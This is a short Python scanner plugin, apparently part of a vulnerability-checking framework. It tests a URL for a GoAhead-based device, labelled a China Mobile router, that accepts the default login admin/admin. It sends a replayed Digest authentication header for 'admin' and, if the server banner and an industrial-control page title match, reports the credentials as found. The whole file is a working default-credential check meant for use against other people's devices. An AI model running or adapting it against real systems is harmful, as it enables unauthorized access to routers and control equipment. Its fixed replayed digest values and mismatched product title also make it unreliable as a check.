#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '中国移动禹路由默认密码',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/5',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
      'Accept-Encoding': 'gzip, deflate',
      'Authorization': '''Digest username="admin", realm="GoAhead", nonce="a1b8d18821382816fb0fa08bb97f1731", uri="/bottom.html", algorithm=MD5, response="d5a7b7b4c2e264d4a5779c78d9291c27", opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=00000007, cnonce="9bb21cfba0d3ca80"''',
      'Connection': 'keep-alive',
      'Referer': f'{url}/index.html',
      'Upgrade-Insecure-Requests': '1',
      'Priority': 'u=4',
      'Pragma': 'no-cache',
      'Cache-Control': 'no-cache',
      }
  # print(headers)
  target = '/index.html'
  url1 = url + target
  ret['url'] = url1
  try:
    res = requests.get(url=url1,headers=headers,timeout=5,verify=False)
    res.encoding = 'utf-8'
    if 'GoAhead-Webs' in res.headers['Server'] and re.search(r'<TITLE>致远工控-WEB页面</TITLE>',res.text,re.S):
      ret['huixian'] = '账号/密码:admin/admin'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret